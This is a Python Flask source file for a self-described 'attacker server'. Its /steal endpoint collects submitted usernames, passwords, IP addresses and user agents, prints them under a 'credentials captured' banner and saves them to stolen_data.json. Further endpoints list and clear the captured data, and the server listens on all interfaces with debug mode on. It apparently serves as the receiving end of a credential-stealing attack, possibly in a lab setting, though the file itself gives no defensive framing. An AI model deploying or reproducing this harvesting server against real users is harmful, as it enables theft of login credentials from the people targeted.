from flask import Flask, request, jsonify
import datetime
import json
import os

app = Flask(__name__)

stolen_data = []


@app.route('/steal', methods=['POST', 'GET'])
def steal_credentials():

    if request.method == 'POST':
        if request.is_json:
            data = request.get_json()
        else:
            data = request.form.to_dict()
    else:
        data = request.args.to_dict()

    log_entry = {
        'timestamp': datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        'data': data,
        'ip_address': request.remote_addr,
        'user_agent': request.headers.get('User-Agent', 'Unknown'),
        'method': request.method
    }

    stolen_data.append(log_entry)

    print("\n" + "=" * 60)
    print("🚨 NEW CREDENTIALS CAPTURED!")
    print("=" * 60)
    print(f"📅 Time: {log_entry['timestamp']}")
    print(f"🌐 IP: {log_entry['ip_address']}")
    print(f"🖥️ Method: {log_entry['method']}")

    if 'username' in data or 'user' in data:
        username = data.get('username') or data.get('user')
        print(f"👤 Username: {username}")

    if 'password' in data or 'pass' in data:
        password = data.get('password') or data.get('pass')
        print(f"🔑 Password: {password}")

    print("=" * 60)

    save_to_file(log_entry)

    return jsonify({"status": "success", "message": "Data received"})


@app.route('/logs')
def show_logs():
    return jsonify({
        "total_entries": len(stolen_data),
        "logs": stolen_data
    })


@app.route('/clear')
def clear_logs():
    stolen_data.clear()
    if os.path.exists('stolen_data.json'):
        os.remove('stolen_data.json')
    return jsonify({"status": "success", "message": "Logs cleared"})


def save_to_file(log_entry):
    try:
        existing_data = []
        if os.path.exists('stolen_data.json'):
            with open('stolen_data.json', 'r', encoding='utf-8') as f:
                existing_data = json.load(f)

        existing_data.append(log_entry)

        with open('stolen_data.json', 'w', encoding='utf-8') as f:
            json.dump(existing_data, f, indent=2, ensure_ascii=False)

        print("💾 Data saved to stolen_data.json")

    except Exception as e:
        print(f"❌ Error saving to file: {e}")


@app.route('/')
def index():
    return """
    <html>
        <head>
            <title>Attacker Server</title>
            <style>
                body { font-family: Arial, sans-serif; margin: 40px; }
                .log { background: #f5f5f5; padding: 10px; margin: 10px 0; border-radius: 5px; }
                .success { color: green; }
                .error { color: red; }
            </style>
        </head>
        <body>
            <h1>🕵️ Attacker Server Running</h1>
            <p>This server is listening for stolen credentials...</p>
            <p><a href="/logs">View All Logs</a> | <a href="/clear">Clear Logs</a></p>
            <p>Total entries captured: <strong>{}</strong></p>
        </body>
    </html>
    """.format(len(stolen_data))


if __name__ == '__main__':
    print("🚀 Starting Attacker Server...")
    print("📡 Server will run on: http://localhost:5001")
    print("📍 Endpoints:")
    print("   - POST/GET /steal - Receive stolen data")
    print("   - GET /logs - View all captured data")
    print("   - GET /clear - Clear all logs")
    print("\nPress Ctrl+C to stop the server\n")

    app.run(host='0.0.0.0', port=5001, debug=True)
